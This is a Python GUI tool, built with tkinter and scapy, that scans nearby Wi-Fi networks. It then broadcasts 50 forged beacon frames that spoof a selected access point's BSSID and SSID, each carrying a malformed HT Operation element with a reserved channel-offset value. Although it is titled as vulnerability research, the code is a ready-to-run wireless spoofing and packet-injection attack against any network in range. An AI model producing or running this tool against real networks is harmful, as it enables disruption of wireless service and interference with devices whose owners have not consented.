import tkinter as tk
from tkinter import ttk, messagebox
from scapy.all import *
import threading

class WifiTestGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WPA3 Vulnerability Researcher")
        self.networks = {} # Store BSSID: SSID
        
        # Interface Selection
        tk.Label(root, text="Monitor Interface:").grid(row=0, column=0)
        self.iface_entry = tk.Entry(root)
        self.iface_entry.insert(0, "wlan0mon")
        self.iface_entry.grid(row=0, column=1)

        # Scanner Table
        self.tree = ttk.Treeview(root, columns=("SSID", "BSSID"), show='headings')
        self.tree.heading("SSID", text="Network Name (SSID)")
        self.tree.heading("BSSID", text="MAC Address (BSSID)")
        self.tree.grid(row=1, column=0, columnspan=2, padx=10, pady=10)

        # Buttons
        tk.Button(root, text="Start Scan", command=self.start_scan_thread).grid(row=2, column=0)
        tk.Button(root, text="Send Invalid Bandwidth Beacon", command=self.send_attack).grid(row=2, column=1)

    def packet_handler(self, pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden"
            if bssid not in self.networks:
                self.networks[bssid] = ssid
                self.tree.insert("", "end", values=(ssid, bssid))

    def start_scan_thread(self):
        self.networks.clear()
        for i in self.tree.get_children(): self.tree.delete(i)
        thread = threading.Thread(target=lambda: sniff(iface=self.iface_entry.get(), prn=self.packet_handler, timeout=10))
        thread.start()

    def send_attack(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showwarning("Error", "Select a target first!")
            return
        
        ssid, bssid = self.tree.item(selected[0])['values']
        iface = self.iface_entry.get()

        # Build packet with "Reserved" Secondary Channel Offset (Value 2)
        # HT Operation Element (ID 61)
        # Byte 1: Primary Channel, Byte 2: Info Subset (Contains Offset bits)
        ht_op_ie = Dot11Elt(ID=61, info=b"\x01" + b"\x02" + b"\x00"*20) 
        
        pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/\
              Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid)/ht_op_ie
        
        print(f"Sending invalid config to {ssid}...")
        sendp(pkt, iface=iface, count=50, inter=0.1, verbose=False)
        messagebox.showinfo("Done", f"Sent 50 packets to {bssid}")

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiTestGUI(root)
    root.mainloop()

